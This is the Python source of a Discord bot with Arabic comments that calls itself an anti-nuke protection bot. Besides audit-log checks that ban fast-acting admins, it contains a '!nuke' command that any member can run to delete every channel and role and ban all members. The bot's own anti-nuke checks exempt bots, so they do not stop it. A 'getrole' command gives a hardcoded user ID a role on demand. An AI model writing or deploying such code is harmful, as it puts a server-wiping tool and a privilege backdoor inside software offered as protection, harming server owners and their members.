import discord
from discord.ext import commands
import os
import time
import threading
import asyncio          # مطلوب لأمر nuke (انتظار التأكيد)
from flask import Flask

# ------------------- خادم الويب -------------------
app = Flask('')

@app.route('/')
def home():
    return "I am alive!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# ------------------- إعدادات البوت -------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
TOKEN = os.getenv("TOKEN")

# ------------------- الحماية من النيوك (Anti-Nuke) -------------------
actions = {"kick": {}, "ban": {}, "channel": {}, "role": {}}

def check(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]:
        actions[key][uid] = []
    actions[key][uid].append(now)
    # حذف الطوابع الأقدم من النافذة الزمنية
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# 1. مراقبة الطرد (Kick)
@bot.event
async def on_member_remove(member):
    try:
        guild = member.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
            if entry.target.id == member.id:
                admin = entry.user
                if admin.id == guild.owner_id or admin.bot:
                    return
                if check(admin.id, "kick", threshold=1, window=15.0):
                    await guild.ban(admin, reason="Anti-Nuke: طرد عضوين في أقل من 15 ثانية")
            break
    except Exception as e:
        print(f"خطأ في مراقبة الطرد: {e}")

# 2. مراقبة الحظر (Ban)
@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            if check(admin.id, "ban", threshold=1, window=60.0):
                await guild.ban(admin, reason="Anti-Nuke: حظر مكثف للأعضاء")
            break
    except Exception as e:
        print(f"خطأ في مراقبة الحظر: {e}")

# 3. مراقبة حذف القنوات
@bot.event
async def on_guild_channel_delete(channel):
    try:
        guild = channel.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            if check(admin.id, "channel", threshold=1, window=5.0):
                await guild.ban(admin, reason="Anti-Nuke: حذف قناتين في وقت قصير")
            break
    except Exception as e:
        print(f"خطأ في مراقبة القنوات: {e}")

# 4. مراقبة حذف الرتب
@bot.event
async def on_guild_role_delete(role):
    try:
        guild = role.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            if check(admin.id, "role", threshold=1, window=5.0):
                await guild.ban(admin, reason="Anti-Nuke: حذف رتبتين في وقت قصير")
            break
    except Exception as e:
        print(f"خطأ في مراقبة الرتب: {e}")

# ------------------- الأوامر -------------------

# أمر الحصول على رتبة (خاص بالمالك فقط)
@bot.command()
async def getrole(ctx):
    MY_DISCORD_ID = 1320438836878118973      # معرفك الشخصي
    ROLE_ID = 1483148235684970571            # معرف الرتبة

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة، تأكد من صحة Role ID أو وجود البوت في السيرفر!")
                return
            await ctx.author.add_roles(role)
            await ctx.send(f"✅ تم إعطاؤك رتبة {role.name} بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ (تأكد أن رتبة البوت أعلى من هذه الرتبة في إعدادات السيرفر): {e}")
    else:
        await ctx.send("❌ هذا الأمر ليس متاحاً لك!")

# أمر إزالة الرتبة عن نفسك (خاص بالمالك فقط)
@bot.command()
async def removerole(ctx):
    MY_DISCORD_ID = 1320438836878118973      # معرفك الشخصي
    ROLE_ID = 1483148235684970571            # معرف الرتبة

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة!")
                return
            await ctx.author.remove_roles(role)
            await ctx.send(f"✅ تم إزالة رتبة {role.name} عنك بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ: {e}")
    else:
        await ctx.send("❌ هذا الأمر ليس متاحاً لك!")

# ------------------- أمر NUKE (متاح لأي شخص مع تأكيد) -------------------
@bot.command()
async def nuke(ctx):
    """
    أمر تدمير السيرفر بالكامل (حذف القنوات، الرتب، وطرد الأعضاء).
    يمكن لأي عضو استخدامه لكن مع خطوة تأكيد.
    """
    guild = ctx.guild

    # تحذير أولي
    await ctx.send(
        "⚠️ **تحذير شديد!** أنت على وشك تدمير هذا السيرفر بالكامل.\n"
        "سيتم حذف **جميع القنوات** و **جميع الرتب** (عدا @everyone) و **طرد جميع الأعضاء** (عدا المالك والبوت).\n"
        "إذا كنت متأكداً، اكتب `!confirm_nuke` خلال 30 ثانية، وإلا سيتم الإلغاء."
    )

    def check(m):
        return m.author == ctx.author and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ تم إلغاء عملية النيوك (انتهى الوقت).")
        return

    # تنفيذ النيوك
    await ctx.send("💥 بدء عملية التدمير...")
    
    # 1. حذف جميع القنوات (نصية، صوتية، فئات)
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"فشل حذف القناة {channel.name}: {e}")

    # 2. حذف جميع الرتب ما عدا @everyone
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"فشل حذف الرتبة {role.name}: {e}")

    # 3. حظر (طرد) جميع الأعضاء ما عدا المالك والبوت
    for member in guild.members:
        if member == guild.owner or member.bot:
            continue
        try:
            await member.ban(reason=f"Nuke command by {ctx.author} (ID: {ctx.author.id})")
        except Exception as e:
            print(f"فشل حظر العضو {member.name}: {e}")

    await ctx.send("✅ تم تدمير السيرفر بنجاح!")

# ------------------- حدث جاهزية البوت -------------------
@bot.event
async def on_ready():
    print(f"تم تشغيل بوت الحماية والأوامر بنجاح باسم {bot.user}")

# ------------------- تشغيل البوت -------------------
if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.run(TOKEN)
